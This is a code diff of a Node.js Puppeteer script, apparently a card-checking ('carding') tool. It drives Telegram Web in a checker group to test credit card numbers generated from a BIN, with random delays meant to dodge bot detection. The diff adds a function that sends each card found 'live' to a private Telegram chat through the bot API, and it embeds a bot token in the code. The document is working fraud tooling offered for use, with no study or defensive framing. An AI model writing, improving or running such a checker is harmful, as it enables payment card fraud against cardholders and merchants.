@@ -14,11 +14,12 @@ var binFileBuffer = await readFile(resolve("./env.txt"));
 var binFileContent = binFileBuffer.toString();;
 
 //return console.log(JSON.stringify(binFileContent))
-var [bin, gate, chat_id] = binFileContent.split("\r\n").map(e => e.split("=")[1])
+var [bin, gate, group_id, person_chat_id ] = binFileContent.split("\r\n").map(e => e.split("=")[1])
 /* 
 const bin = "43561902140xxxxx|03|2029|rnd";
 var gate = ".ap"; */
 
+//console.log(person_chat_id)
 
 const app = express()
 const port = 3000;
@@ -55,7 +56,7 @@ if (localStorageJSON !== "") {
 var page = await browser.newPage();
 page1.close();
 // Navigate the page to a URL.
-await page.goto('https://web.telegram.org/a/' + chat_id,{timeout:60_000});
+await page.goto('https://web.telegram.org/a/' + group_id,{timeout:60_000});
 
 
 await new Promise(r => {
@@ -102,7 +103,7 @@ function antibot() {
       await page.close();
       page = page1;
       await new Promise(r => {setTimeout(() => {r(true)}, generateRandomNumber(5000,10000))})
-      await page.goto('https://web.telegram.org/a/' + chat_id);
+      await page.goto('https://web.telegram.org/a/' + group_id);
     }
 
 
@@ -155,14 +156,15 @@ async function interval() {
     for (let i = cardsStatuses.length - 1; i >= 0; i--) {
       //console.log(i+1)
 
-      if (cardsStatuses[i].live  && queue.includes(cardsStatuses[i].card)) {
+      if (cardsStatuses[i].live /*  && queue.includes(cardsStatuses[i].card) */) {
         console.log("se encontro live: ", JSON.stringify(cardsStatuses[i]))
-        var fileContent = await readFile(resolve("./lives.json"))
+        /* var fileContent = await readFile(resolve("./lives.json"))
         var liveCards = JSON.parse(fileContent);
         if (!liveCards.find(e => e.card === cardsStatuses[i].card)) {
           liveCards.push(cardsStatuses[i]);
           await writeFile(resolve("./lives.json"), JSON.stringify(liveCards))
-        }
+        } */
+        await notificartelegramTarjetaLive(cardsStatuses[i])
       }
       if (queue.includes(cardsStatuses[i].card)) {
         console.log("se encontro y se borrará :", cardsStatuses[i].card, " con index " + queue.indexOf(cardsStatuses[i].card))
@@ -356,7 +358,57 @@ async function updateQr() {
 }
 
 
+async function notificartelegramTarjetaLive(liveCardObj) {
+  var message = "";
+  message+="Live Card ✅\n\n";
+  message+="*Card:* `"+liveCardObj.card+"`\n";
+  message+="*Date:* `"+liveCardObj.date+"`\n";
+  message+="*Bin:* `"+bin+"`";
+  var apiEndpoint = "https://api.telegram.org/bot";
+  var token = "6832202278:AAFjb4FtUKxH47-37kiE7apho9s8X6nDpvk";
+  try {
+  
+      var options =
+  
+           {
+  
+             'headers': {"Content-Type" : "application/json"},
+  
+             'method' : "POST",
+  
+             'body' : JSON.stringify({
+  
+               "method":"sendMessage",
+  
+               "chat_id":person_chat_id,
+  
+               "text":message,
+               "parse_mode":"Markdown"
+  
+             })
+  
+      };    
+  
+    var response = await fetch(apiEndpoint+token+"/", options);
+    var responseMessage = await response.json();
+    if(responseMessage.ok){
+      console.log("Se envio la live "+liveCardObj.card+" a el telegram")
+    }else{
 
+      throw new Error(responseMessage.description);
+      
+    }
+   /*  await responseMessage({chat_id: person_chat_id, message_id: responseMessage.message_id, message})
+ */
+
+  
+      //var json = JSON.parse(response.getContentText());
+  
+  } catch (err) {
+    console.log("Error para enviar mensaje a persona:")
+    console.log(err)
+  }
+}
 
 })()
 
@@ -368,3 +420,4 @@ function generateDate() {
   var dateOb = new Date();
   return dateOb.toLocaleTimeString('es-CO', { hour12: true })+" - "+dateOb.toLocaleDateString("es-CO");
 }
+
